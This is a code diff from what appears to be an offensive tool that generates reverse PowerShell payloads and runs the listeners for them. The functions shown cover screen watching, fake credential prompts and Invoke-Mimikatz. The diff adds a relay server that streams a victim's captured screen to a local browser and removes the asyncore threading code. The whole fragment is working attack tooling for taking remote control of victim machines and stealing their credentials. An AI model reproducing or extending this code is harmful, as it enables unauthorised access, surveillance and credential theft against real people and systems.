@@ -115,21 +115,22 @@ def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
     checkClientUpload(payloadname,powershellExec,isExe=False)
     from listener import Server
     listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
-    async = threading.Thread(target=asyncore.loop, args=(0.1,))
-    async.setDaemon(True)
-    async.start()
+    relayserver = Server('127.0.0.1', 8081, relay=True)
+    os.system('firefox 127.0.0.1:8081')
     print 'waiting for connection...\nCTRL + C when done\n'
     try:
         while not listenerserver.handlers:
             time.sleep(0.5)
         while listenerserver:
             if listenerserver.handlers[1].in_buffer:
-                print listenerserver.handlers[1].in_buffer.pop()
+                relayserver.handlers[1].out_buffer.append(listenerserver.handlers[1].in_buffer.pop())
     except KeyboardInterrupt:
         if listenerserver.handlers:
             listenerserver.handlers[1].handle_close()
         listenerserver.close()
+        relayserver.close()
         del listenerserver
+        del relayserver
     return "pass"
 
 def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
@@ -141,9 +142,6 @@ def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
     checkClientUpload(payloadname,powershellExec,isExe=False)
     from listener import Server
     listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
-    async = threading.Thread(target=asyncore.loop, args=(0.1,))
-    async.setDaemon(True)
-    async.start()
     print 'waiting for connection...\nCTRL + C when done\n'
     try:
         while not listenerserver.handlers:
@@ -167,9 +165,6 @@ def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
     checkClientUpload(payloadname,powershellExec,isExe=False)
     from listener import Server
     listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
-    async = threading.Thread(target=asyncore.loop, args=(0.1,))
-    async.setDaemon(True)
-    async.start()
     print 'waiting for connection...\nCTRL + C when done\n'
     try:
         while not listenerserver.handlers:
